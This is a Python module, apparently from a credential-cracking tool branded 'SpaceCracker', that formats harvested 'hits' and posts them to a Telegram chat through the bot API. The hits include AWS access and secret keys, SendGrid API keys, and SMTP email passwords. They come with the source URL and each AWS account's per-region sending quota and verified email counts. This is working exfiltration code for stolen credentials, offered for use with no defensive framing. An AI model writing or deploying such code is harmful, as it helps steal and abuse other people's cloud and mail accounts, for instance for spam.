import asyncio
import aiohttp
from typing import Dict, List
import json

class TelegramReporter:
    def __init__(self, bot_token: str, chat_id: str):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.api_url = f"https://api.telegram.org/bot{bot_token}"
        
    async def send_hit(self, hit_data: Dict):
        """Send formatted hit to Telegram"""
        message = self.format_hit_message(hit_data)
        
        params = {
            'chat_id': self.chat_id,
            'text': message,
            'parse_mode': 'HTML',
            'disable_web_page_preview': True
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                url = f"{self.api_url}/sendMessage"
                await session.post(url, data=params)
        except Exception as e:
            print(f"Error sending Telegram message: {e}")
    
    def format_hit_message(self, hit_data: Dict) -> str:
        """Format hit data for Telegram"""
        service = hit_data.get('service', 'Unknown')
        
        if service == 'aws':
            return self.format_aws_hit(hit_data)
        elif service == 'sendgrid':
            return self.format_sendgrid_hit(hit_data)
        elif service == 'smtp':
            return self.format_smtp_hit(hit_data)
        
        # Generic format
        return f"<b>New hit found:</b>\n<code>{json.dumps(hit_data, indent=2)}</code>"
    
    def format_aws_hit(self, data: Dict) -> str:
        """Format AWS hit for Telegram"""
        validation = data.get('validation', {})
        credentials = data.get('credentials', {})
        
        message = f"""
✨ <b>New Hit (#{data.get('crack_id', 'N/A')})</b>

👉 <b>USER:</b> <code>{credentials.get('access_key', 'N/A')}</code>
👉 <b>PASS:</b> <code>{credentials.get('secret_key', 'N/A')}</code>
🔐 <b>ACCESS LEVEL:</b> {validation.get('access_level', 'Unknown')}

📊 <b>{len(validation.get('regions', {}))} regions with access</b>
"""
        
        for region, region_data in validation.get('regions', {}).items():
            message += f"""
🌍 <b>{region.upper()}:</b>
📈 QUOTA - ({region_data.get('quota_max', 0)} per day)
✅ VERIFIED: {len(region_data.get('verified_emails', []))} emails
"""
        
        message += f"""
🚀 <b>HIT WORKS:</b> {'Yes' if validation.get('valid') else 'No'}
ℹ️ <b>URL:</b> {data.get('url', 'N/A')}
🆔 <b>Crack ID:</b> #{data.get('crack_id', 'N/A')}

✨ SpaceCracker.co - @SpaceCracker
"""
        return message
    
    def format_sendgrid_hit(self, data: Dict) -> str:
        """Format SendGrid hit for Telegram"""
        credentials = data.get('credentials', {})
        
        message = f"""
✨ <b>New SendGrid Hit (#{data.get('crack_id', 'N/A')})</b>

🔑 <b>API KEY:</b> <code>{credentials.get('api_key', 'N/A')}</code>
🚀 <b>HIT WORKS:</b> {'Yes' if data.get('validation', {}).get('valid') else 'No'}
ℹ️ <b>URL:</b> {data.get('url', 'N/A')}

✨ SpaceCracker.co - @SpaceCracker
"""
        return message
    
    def format_smtp_hit(self, data: Dict) -> str:
        """Format SMTP hit for Telegram"""
        credentials = data.get('credentials', {})
        
        message = f"""
✨ <b>New SMTP Hit (#{data.get('crack_id', 'N/A')})</b>

📧 <b>EMAIL:</b> <code>{credentials.get('email', 'N/A')}</code>
🔐 <b>PASSWORD:</b> <code>{credentials.get('password', 'N/A')}</code>
🌐 <b>HOST:</b> {credentials.get('host', 'N/A')}
🔌 <b>PORT:</b> {credentials.get('port', 'N/A')}
🚀 <b>HIT WORKS:</b> {'Yes' if data.get('validation', {}).get('valid') else 'No'}
ℹ️ <b>URL:</b> {data.get('url', 'N/A')}

✨ SpaceCracker.co - @SpaceCracker
"""
        return message